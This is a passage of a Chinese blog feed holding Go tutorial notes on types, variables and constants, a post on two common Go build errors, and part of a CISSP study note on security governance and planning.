<br></code></pre></td></tr></table></figure><h5 id="p"><a href="#p" class="headerlink" title="%p"></a>%p</h5><p>指针，十六进制显示</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型用于声明函数和变量，不同的数据类型代表不同大小内存大小</p><h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>值必须是常量 true 或者 false</p><p>var booltest bool &#x3D; true</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> code<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> booltest <span class="hljs-type">bool</span> = <span class="hljs-literal">true</span><br><span class="hljs-built_in">println</span>(booltest)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">➜  code <span class="hljs-keyword">go</span> run booltest.<span class="hljs-keyword">go</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><h4 id="整型int"><a href="#整型int" class="headerlink" title="整型int"></a>整型int</h4><p>uint8  无符号 8 位整型 (0 到 255)</p><p>uint16  无符号 16 位整型（0 到 65535）</p><p>uint32 无符号 32 位整型  (0 到 4294967295)</p><p>uint64 无符号 64 位整型 (0 到 18446744073709551615)</p><p>int8 有符号 8 位整型（-128 到 127）</p><p>int16 有符号 16 位整型  (-32768 到 32767)</p><p>int32 有符号 32 位整型  (-2147483648 到 2147483647)</p><p>int64 有符号 64 位整型  (-9223372036854775808 到 9223372036854775807)</p><p>byte 类似uint8</p><p>rune 类似int32</p><p>uint 32 或 64 位</p><p>int 与uint一样大小</p><p>uintptr 无符号整型，用于存放一个指针</p><h4 id="浮点型-float"><a href="#浮点型-float" class="headerlink" title="浮点型 float"></a>浮点型 float</h4><p> float32、float64</p><p>支持复数，位的运算采用补码</p><h3 id="派生类型"><a href="#派生类型" class="headerlink" title="派生类型"></a>派生类型</h3><p>指针类型 Pointer</p><p>数组类型</p><p>结构化类型 struct</p><p>Channel类型</p><p>函数类型</p><p>切片类型</p><p>接口类型 interface</p><p>Map类型</p><h2 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h2><p>变量可以通过变量名访问</p><p>变量名由字母、数字、下划线组成，首字母不可以是数字</p><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>声明变量使用 var 关键字</p><h4 id="声明变量类型"><a href="#声明变量类型" class="headerlink" title="声明变量类型"></a>声明变量类型</h4><p>var 变量名 变量类型</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> vartest <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure><p>整型变量未赋值，默认是0</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">//声明整型变量不初始化，默认是空值</span><br>var <span class="hljs-built_in">int</span>test <span class="hljs-built_in">int</span><br>fmt.Println(<span class="hljs-built_in">int</span>test)<br><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>布尔型变量未赋值，默认是false</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">//声明布尔型变量不初始化，默认是false</span><br>var <span class="hljs-built_in">bool</span>test <span class="hljs-built_in">bool</span><br>fmt.Println(<span class="hljs-built_in">bool</span>test)<br><br><span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>字符型变量未赋值，默认是“”，空字符串</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//声明字符变量不初始化，默认是空</span><br><span class="hljs-keyword">var</span> strtest <span class="hljs-built_in">string</span><br><span class="hljs-comment">//strtest = &quot;strtest&quot;</span><br>fmt.Println(strtest)<br></code></pre></td></tr></table></figure><h4 id="根据值自动设置变量类型"><a href="#根据值自动设置变量类型" class="headerlink" title="根据值自动设置变量类型"></a>根据值自动设置变量类型</h4><p>var 变量名 &#x3D; 变量值</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">var <span class="hljs-built_in">bool</span>vartest = <span class="hljs-literal">true</span><br>fmt.Println(<span class="hljs-built_in">bool</span>vartest)<br><br>var <span class="hljs-built_in">string</span>vartest = <span class="hljs-string">&quot;this is string var test&quot;</span><br>fmt.Println(<span class="hljs-built_in">string</span>vartest)<br></code></pre></td></tr></table></figure><h4 id="声明-赋值"><a href="#声明-赋值" class="headerlink" title="声明+赋值"></a>声明+赋值</h4><p>变量名 :&#x3D; 变量值</p><p>注意：已经使用 var 声明过的变量，再使用 :&#x3D; 会报错</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span>var1test := <span class="hljs-string">&quot;this is var := test &quot;</span><br>fmt.Println(<span class="hljs-built_in">string</span>var1test)<br><br>var <span class="hljs-built_in">string</span>vartest <span class="hljs-built_in">string</span> = <span class="hljs-string">&quot;this is string var test&quot;</span><br>fmt.Println(<span class="hljs-built_in">string</span>vartest)<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">var stringvartest <span class="hljs-built_in">string</span> = <span class="hljs-string">&quot;this is string var test&quot;</span><br>fmt.Println(stringvartest)<br><br>stringvartest := <span class="hljs-string">&quot;error test&quot;</span><br>fmt.Println(stringvartest)<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br># <span class="hljs-keyword">command</span>-<span class="hljs-built_in">line</span>-arguments<br>./hello.<span class="hljs-keyword">go</span>:<span class="hljs-number">17</span>:<span class="hljs-number">16</span>: <span class="hljs-keyword">no</span> <span class="hljs-keyword">new</span> variables <span class="hljs-keyword">on</span> <span class="hljs-keyword">left</span> side of :=<br></code></pre></td></tr></table></figure><h4 id="多变量声明赋值"><a href="#多变量声明赋值" class="headerlink" title="多变量声明赋值"></a>多变量声明赋值</h4><p>var name1,name2,name3 type &#x3D; value1, value2, value3</p><p>name11,name12 :&#x3D; value11,value12</p><p>var test1,test2,test3 int &#x3D; 1,2,3</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> test1, test2, test3 <span class="hljs-type">int</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span><br>fmt.Println(test1, test2, test3)<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span> <br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">test11, test12, test13 := <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span><br>fmt.Println(test11, test12, test13)<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span> <br><span class="hljs-number">11</span> <span class="hljs-number">12</span> <span class="hljs-number">13</span><br></code></pre></td></tr></table></figure><h4 id="全局变量声明"><a href="#全局变量声明" class="headerlink" title="全局变量声明"></a>全局变量声明</h4><p>var (</p><p>   name1 type1</p><p>   name2 type2</p><p>)</p><h3 id="值类型-指针类型"><a href="#值类型-指针类型" class="headerlink" title="值类型&#x2F;指针类型"></a>值类型&#x2F;指针类型</h3><p>类似 int, float, bool, string等这些基本类型，使用这些变量就是直接指向存在内存的值</p><p>使用等号&#x3D;，将一个变量的值赋给另一个变量，也就是将指定内存中的值拷贝一份过去</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>1、:&#x3D; 不可以用于全局变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>a <span class="hljs-type">int</span><br>b <span class="hljs-type">string</span><br>c := <span class="hljs-number">1</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>time.Sleep(<span class="hljs-number">1</span> * time.Second)<br>fmt.Println(a, b, c)<br><br>&#125;<br><br>➜  firstGoland <span class="hljs-keyword">go</span> build hello.<span class="hljs-keyword">go</span><br># command-line-arguments<br>./hello.<span class="hljs-keyword">go</span>:<span class="hljs-number">11</span>:<span class="hljs-number">4</span>: syntax <span class="hljs-type">error</span>: unexpected :=, expected =<br></code></pre></td></tr></table></figure><p>2、相同代码块不可以重复声明变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := <span class="hljs-number">1</span><br>a := <span class="hljs-number">2</span><br>fmt.Println(a)<br>&#125;<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span>  <br># command-line-arguments<br>./hello.<span class="hljs-keyword">go</span>:<span class="hljs-number">9</span>:<span class="hljs-number">4</span>: no <span class="hljs-built_in">new</span> variables on left side of :=<br></code></pre></td></tr></table></figure><p>3、全局变量名可以和局部变量名相同，代码块中声明的变量优先</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">var</span> (<br><span class="hljs-selector-tag">a</span> int<br>)<br><br>func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">a</span> := <span class="hljs-string">&quot;test&quot;</span><br>fmt.<span class="hljs-built_in">Println</span>(a)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br>test<br></code></pre></td></tr></table></figure><p>4、局部变量声明必须使用，全局变量声明可以不使用</p><p>5、多变量赋值，值按顺序赋值给变量名</p><p>6、变量值交换</p><p>a, b&#x3D;b, a</p><p>变量类型必须一致</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">func <span class="hljs-selector-tag">main</span>() &#123;<br><span class="hljs-selector-tag">a</span> := <span class="hljs-string">&quot;a value&quot;</span><br><span class="hljs-selector-tag">b</span> := <span class="hljs-string">&quot;b value&quot;</span><br><span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">b</span>, <span class="hljs-selector-tag">a</span><br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;a = &quot;</span> + a)<br>fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;b = &quot;</span> + b)<br>&#125;<br><br>➜  firstGoland go run hello<span class="hljs-selector-class">.go</span><br><span class="hljs-selector-tag">a</span> = <span class="hljs-selector-tag">b</span> value<br><span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span> value<br></code></pre></td></tr></table></figure><p>7、空白标识符 _ 用于抛弃值，常用于获取函数返回值</p><p>因为go语言要求必须使用所有变量，日常开发会存在从函数获取到不使用值的可能性</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>_, testfuncb := testfunc()<br>fmt.Println(testfuncb)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testfunc</span><span class="hljs-params">()</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">string</span>) &#123; <span class="hljs-comment">//可以返回多个值</span><br>a := <span class="hljs-string">&quot;a value&quot;</span><br>b := <span class="hljs-string">&quot;b value&quot;</span><br><span class="hljs-comment">//fmt.Println(&quot;a = &quot; + a)</span><br><span class="hljs-comment">//fmt.Println(&quot;b = &quot; + b)</span><br><span class="hljs-keyword">return</span> a, b<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br>b value<br></code></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>程序运行不会修改常量的值</p><p>常量只能是数字型（整型、浮点型、复数）、布尔型和字符串型</p><h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><p>const 常量名 [常量类型] &#x3D; 常量值</p><h4 id="显式定义类型"><a href="#显式定义类型" class="headerlink" title="显式定义类型"></a>显式定义类型</h4><p>const 常量名 常量类型 &#x3D; 常量值</p><p>const constname int &#x3D; 1</p><h4 id="隐式定义类型"><a href="#隐式定义类型" class="headerlink" title="隐式定义类型"></a>隐式定义类型</h4><p>const 常量名 &#x3D; 常量值</p><p>const constname1 &#x3D; “constname1”</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> constname <span class="hljs-type">int</span> = <span class="hljs-number">1</span><br>fmt.Println(constname)<br><br><span class="hljs-keyword">const</span> constname1 = <span class="hljs-string">&quot;constname1&quot;</span><br>fmt.Println(constname1)<br>&#125;<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run consttest.<span class="hljs-keyword">go</span><br><span class="hljs-number">1</span><br>constname1<br></code></pre></td></tr></table></figure><h4 id="多常量定义"><a href="#多常量定义" class="headerlink" title="多常量定义"></a>多常量定义</h4><p>const constname1, constname2, constname3 &#x3D; constvalue1, constvalue2, constvalue3</p><p>const (</p><p>constname1 &#x3D; constvalue1</p><p>constname2 &#x3D; constvalue2</p><p>constname3 &#x3D; constvalue3</p><p>)</p><h4 id="常量表达式"><a href="#常量表达式" class="headerlink" title="常量表达式"></a>常量表达式</h4><p>常量可以用len()、cap()、unsafe.Sizeof()函数计算表达式的值，只有内置函数才可以进行常量表达式计算</p><p>unsafe.Sizeof(var)：获取指定变量&#x2F;常量数据类型的字节数，根据变量&#x2F;常量类型，和存储的值无关，返回的是无符号整型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> constname1 = <span class="hljs-string">&quot;constvalue1&quot;</span><br><span class="hljs-keyword">const</span> lenconstname1 = <span class="hljs-built_in">len</span>(constname1)<br><br>fmt.Println(constname1, lenconstname1, unsafe.Sizeof(constname1))<br>&#125;<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run consttest.<span class="hljs-keyword">go</span><br>constvalue1 <span class="hljs-number">11</span> <span class="hljs-number">16</span><br></code></pre></td></tr></table></figure><h3 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h3><p>特殊常量，可以被编译器修改的常量</p><p>iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang_error</title>
    <link href="/2024/12/24/dev/golang/golang_error/"/>
    <url>/2024/12/24/dev/golang/golang_error/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="runtime-main-main·f-function-main-is-undeclared-in-the-main-package"><a href="#runtime-main-main·f-function-main-is-undeclared-in-the-main-package" class="headerlink" title="runtime.main_main·f: function main is undeclared in the main package"></a>runtime.main_main·f: function main is undeclared in the main package</h2><h3 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ada">➜  gocode go run printgo.go<br># command-line-arguments<br>runtime.main_main·f: <span class="hljs-keyword">function</span> <span class="hljs-title">main</span> <span class="hljs-keyword">is</span> undeclared <span class="hljs-keyword">in</span> the main <span class="hljs-keyword">package</span><br><span class="hljs-title"><span class="hljs-keyword">package</span> main</span><br><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func printtest() &#123;<br>fmt.Println(<span class="hljs-string">&quot;test&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h3><p>Go程序中找不到主函数（main函数）的定义或声明。在Go中，每个可执行程序都必须包含一个名为<code>main</code>的包，并在该包中包含一个名为<code>main</code>的函数。这个<code>main</code>函数是程序的入口点，它会被自动调用。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>增加main函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printtest</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;test&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>printtest()<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="go-run-提示package-command-line-arguments-is-not-a-main-package"><a href="#go-run-提示package-command-line-arguments-is-not-a-main-package" class="headerlink" title="go run 提示package command-line-arguments is not a main package"></a>go run 提示package command-line-arguments is not a main package</h2><h3 id="报错信息-1"><a href="#报错信息-1" class="headerlink" title="报错信息"></a>报错信息</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> code<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> booltest <span class="hljs-type">bool</span> = <span class="hljs-literal">true</span><br><span class="hljs-built_in">println</span>(booltest)<br>&#125;<br><br>➜  code <span class="hljs-keyword">go</span> run booltest.<span class="hljs-keyword">go</span> <br><span class="hljs-keyword">package</span> command-line-arguments is not a main <span class="hljs-keyword">package</span><br></code></pre></td></tr></table></figure><h3 id="报错原因-1"><a href="#报错原因-1" class="headerlink" title="报错原因"></a>报错原因</h3><p>使用 go run 命令运行的包必须是主包，也就是package 需要声明为 main </p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>package code</p><p>修改为</p><p>package main</p>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cissp-实现安全治理的原则和策略</title>
    <link href="/2024/12/24/security/seccert/cissp/cissp-%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E6%B2%BB%E7%90%86%E7%9A%84%E5%8E%9F%E5%88%99%E5%92%8C%E7%AD%96%E7%95%A5/"/>
    <url>/2024/12/24/security/seccert/cissp/cissp-%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E6%B2%BB%E7%90%86%E7%9A%84%E5%8E%9F%E5%88%99%E5%92%8C%E7%AD%96%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="评估和应用安全治理原则"><a href="#评估和应用安全治理原则" class="headerlink" title="评估和应用安全治理原则"></a>评估和应用安全治理原则</h3><h4 id="第三方治理"><a href="#第三方治理" class="headerlink" title="第三方治理"></a>第三方治理</h4><p>一方面可能是由法律、法规、行业标准、合同义务或许可要求强制执行的外部实体监督系统</p><p>另一方是组织对所依赖的第三方应用进行安全监督，例如外包</p><p>侧重点在于验证其是否符合声明的安全目标、需求、法规和合同义务</p><h4 id="文件审查"><a href="#文件审查" class="headerlink" title="文件审查"></a>文件审查</h4><p>文件审查是查看交换材料并根据标准和期望对其进行验证的过程。</p><p>通常发生在现场检查之前，如果所交换的文件充分并且满足期望（或至少满足需求），那么现场审查将集中审查其与所声明文件是否相符；如果所交换的文件不完整、不准确或不充分，现场审查将推迟到文件更新或更正后进行。</p><p>如果文件不合规，那现场也可能不合规。</p><p>风险管理、风险评估和风险处置是执行流程&#x2F;策略评审时所使用的方法与技术。</p><h3 id="管理安全功能"><a href="#管理安全功能" class="headerlink" title="管理安全功能"></a>管理安全功能</h3><p>安全功能是业务运营的一个方面，专注于随着时间的推移评估和改进安全性的任务。</p><p>通过执行风险评估以推动安全策略的行为是有关安全功能管理的最清晰与最直接的示例。</p><p>安全必须是可衡量的。</p><p>可衡量的安全意味着安全机制的各个方面都发挥作用，提供明显的收益，并有一个或多个可以进行记录与分析的指标。</p><p>当实施安全对策或保护措施后，安全指标应显示出意外事件数量的减少或尝试检测事件数量的增加。</p><p>测量和评估安全指标的行为可以评估安全计划的完整性和有效性。</p><p>还应该包括根据通用安全准则对安全计划进行测量，并跟踪其控制措施的成功与否。</p><h4 id="与业务战略、目标、使命和宗旨相一致的安全功能"><a href="#与业务战略、目标、使命和宗旨相一致的安全功能" class="headerlink" title="与业务战略、目标、使命和宗旨相一致的安全功能"></a>与业务战略、目标、使命和宗旨相一致的安全功能</h4><p>安全管理计划确保正确地创建、执行和实施安全策略。</p><p>最能有效处理安全管理计划的一个方法是自上而下方法。</p><p>1、上层、高级或管理部门负责启动和定义组织的策略。安全策略为组织架构内的各个级别提供指导。</p><p>2、中层管理人员负责将安全策略落实到标准、基线、指导方针和程序。</p><p>3、操作管理人员或安全专业人员必须实现安全管理文档中规定的配置。</p><p>4、最终用户必须遵守组织的所有安全策略。</p><p>安全管理计划的内容包括：定义安全角色，规定如何管理安全、由谁负责安全以及如何检验安全的有效性，制定安全策略，执行风险分析，要求对员工进行安全教育。</p><p>安全管理计划团队应制定战略计划、战术计划和操作计划三种类型的计划。</p><p>1、战略计划（strategic plan）</p><p>相对稳定的长期计划，定义组织的安全目的和安全功能。</p><p>有效期大约是5年。</p><p>也被视为愿景规划</p><p>讨论了未来的长期目标和愿景，需要包含风险评估。</p><p>2、战术计划（tactical plan）</p><p>中期计划</p><p>为战略计划中设定的目标提供更多细节，该计划也可根据不可预测的事件临时制定。</p><p>有效期大约是1年左右。</p><p>通常规定和安排实现组织目标所需的任务。</p><p>可以包含项目计划、收购计划、招聘计划、预算计划、维护计划、支持计划和系统开发计划。</p><p>3、操作计划（operational plan）</p><p>短期、高度详细的计划</p><p>在战略计划和战术计划的基础上制定</p><p>短期内有效或有用</p><p>必须经常更新（如每月或每季度），以保证其与战术计划的一致性。</p><p>阐明了如何实现组织的各种目标，包括资源分配、预算需求、人员分配、进度安排与细化或执行程序。</p><p>包含执行流程与组织安全策略的合规性细节。</p><p>可以包含培训计划、系统部署计划和产品设计计划。</p><p>安全是一个持续的过程。</p><p>安全管理计划的活动可能有一个确定的起点，但其任务和工作永远无法彻底完成或实现。</p><p>有效的安全计划关注具体和可实现的目标、预测变化和潜在问题，并充当整个组织决策的基础。</p><p>安全文档应该是具体的、定义完善的和明确说明的。</p><h4 id="组织的流程"><a href="#组织的流程" class="headerlink" title="组织的流程"></a>组织的流程</h4><p>安全治理需要关注组织的方方面面，包括收购、资产剥离和治理委员会的组织流程。</p><p><strong>收购与兼并会提升组织的安全风险</strong>，这些风险包括不恰当的信息泄露、数据丢失、停机或未能获得足够的投资回报率（return on investment，ROI），还需要良好的安全监督和加强的审查。</p><p>收购如果不考虑安全性，所收购的产品固有风险将在整个部署生命周期内一直存在。</p><p>重要的是评估与硬件、软件和服务相关的风险。</p><p>收购不仅涉及硬件和软件，也包括外包、与供应商签订合同、聘请顾问等内容。与外部实体协同工作时，不仅要重视集成的安全性评估，还要确保在设计产品时考虑了安全性。</p><p>当使用第三方评估和监控服务时，外部实体需要在其操作中体现出安全意识。</p><p>在为安全集成评估第三方时，考虑以下过程：</p><p>1、<strong>现场评估</strong> 到组织现场进行访谈，观察工作人员的操作习惯。</p><p>2、<strong>文件交换和审查</strong> 调查数据和文件记录交换的方式，以及执行评估和审查的正式过程。</p><p>3、<strong>过程&#x2F;策略审查</strong> 要求提供安全策略、过程&#x2F;程序，以及事件和响应文件的副本以供审查。</p><p>4、<strong>第三方审计</strong> 根据美国注册会计师协会（AICPA）的定义，拥有独立性的第三方审计机构可根据SOC报告，对实体的安全基础设施进行公正的审查。</p><p>为所有收购设立最低限度的安全要求。</p><p><strong>资产剥离或任何形式的资产减少或员工裁减</strong>，会增加组织对集中安全治理的需求。</p><p>具体治理需求：</p><p>1、对资产进行净化以防止数据泄露。</p><p>2、应该删除和销毁存储介质，因为介质净化处理技术不能保证残留数据不会被恢复。</p><p>3、对于不再负责相关事宜的员工，应询问其工作完成情况，也称为离职面谈。通常包含审查所有保密协议以及其他任何在此雇佣关系终止后继续生效的约束合同或协议。</p><h4 id="组织的角色与责任"><a 